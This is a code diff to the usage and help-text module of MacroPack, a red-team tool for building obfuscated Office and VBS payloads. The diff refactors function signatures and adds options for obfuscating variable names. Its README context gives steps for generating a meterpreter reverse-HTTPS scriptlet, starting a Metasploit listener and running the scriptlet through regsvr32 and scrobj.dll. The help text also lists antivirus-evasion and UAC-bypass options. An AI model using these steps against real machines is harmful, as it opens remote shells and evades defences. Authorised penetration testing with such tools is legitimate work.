@@ -50,7 +50,7 @@ From README:
  ```batch
 # 1 Generate obfuscated VBS scriptlet and Metasploit resource file based on meterpreter reverse HTTPS template
 echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
-# 2 On attacker machinge Setup meterpreter listener
+# 2 On attacker machine Setup meterpreter listener
 msfconsole -r webmeter.rc
 # 3 run scriptlet with regsvr32 
 regsvr32 /u /n /s /i:meter.sct scrobj.dll
@@ -148,7 +148,7 @@ r"""
     return templatesInfo
     
 
-def getGenerationFunction(currentApp):
+def getGenerationFunction():
     details = """ Main payload generation options:
     -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the payload format based on extension.
         MacroPack supports most Ms Office and VB based payloads as well various kinds of shortcut files. 
@@ -164,9 +164,13 @@ def getGenerationFunction(currentApp):
     return details
 
 
-def getAvBypassFunction(currentApp):
+def getAvBypassFunction():
     details = """ Security bypass options: 
     -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)
+    --obfuscate-names-charset=<CHARSET> Set a charset for obfuscated variables and functions
+        Choose between: alpha, alphanum, complete or provide the list of char you want
+    --obfuscate-names-minlen=<len> Set min length of obfuscated variables and functions (default 8)
+    --obfuscate-names-maxlen=<len> Set max length of obfuscated variables and functions (default 20)
     --uac-bypass Execute payload with high privileges if user is admin. Compatible with most MacroPack templates """ 
     return details
 
@@ -191,7 +195,7 @@ def getOtherFunction(currentApp):
             In this case, windows or linux explorers will show the file named as: somethingath.jpg
     -l, --listen=ROOT_PATH\tOpen an HTTP server from ROOT_PATH listening on default port 80.
     -w, --webdav-listen=ROOT_PATH Open a WebDAV server on default port 80, giving access to ROOT_PATH.
-    --port=PORT Specify the listening port for HTTP and WebDAV servers.""" % (currentApp)
+    --port=PORT Specify the listening port for HTTP and WebDAV servers.""" % currentApp
     return details
 
 
@@ -203,7 +207,7 @@ def getCommunityUsage(currentApp):
 
 %s
 
-""" % (getGenerationFunction(currentApp), getAvBypassFunction(currentApp), getOtherFunction(currentApp))
+""" % (getGenerationFunction(), getAvBypassFunction(), getOtherFunction(currentApp))
     return details
     
 
@@ -231,7 +235,7 @@ def printAvailableFormats(banner):
         printAvailableFormatsPro()
     
 
-def printCommunityUsage(banner, currentApp, mpSession):
+def printCommunityUsage(banner, currentApp):
     print(colored(banner, 'green'))
     print(" Usage 1: echo  <parameters> | %s -t <TEMPLATE> -G <OUTPUT_FILE> [options] " %currentApp)
     print(" Usage 2: %s  -f input_file_path -G <OUTPUT_FILE> [options] " % currentApp)
@@ -252,7 +256,7 @@ r"""
     
     
 
-def printProUsage(banner, currentApp, mpSession):
+def printProUsage(banner, currentApp):
     print(colored(banner, 'green'))
     print(" Usage 1: echo  <parameters> | %s -t <TEMPLATE> -G <OUTPUT_FILE> [options] " %currentApp)
     print(" Usage 2: %s  -f input_file_path -G <OUTPUT_FILE> [options] " % currentApp)
@@ -267,7 +271,7 @@ def printProUsage(banner, currentApp, mpSession):
 %s
 %s
 
-""" % (getGenerationFunction(currentApp), getGenerationFunctionPro(), getAvBypassFunction(currentApp), getAvBypassFunctionPro(), getOtherFunction(currentApp), getOtherFunctionPro())
+""" % (getGenerationFunction(), getGenerationFunctionPro(), getAvBypassFunction(), getAvBypassFunctionPro(), getOtherFunction(currentApp), getOtherFunctionPro())
     details +="    -h, --help   Displays help and exit \n"
 
     print(details)
@@ -281,11 +285,9 @@ def printTemplatesUsage(banner, currentApp):
 
     
     
-def printUsage(banner, currentApp, mpSession):
+def printUsage(banner, currentApp):
     if MP_TYPE=="Pro":
-        printProUsage(banner, currentApp, mpSession)
+        printProUsage(banner, currentApp)
     else:
-        printCommunityUsage(banner, currentApp, mpSession)
-
-
+        printCommunityUsage(banner, currentApp)
 
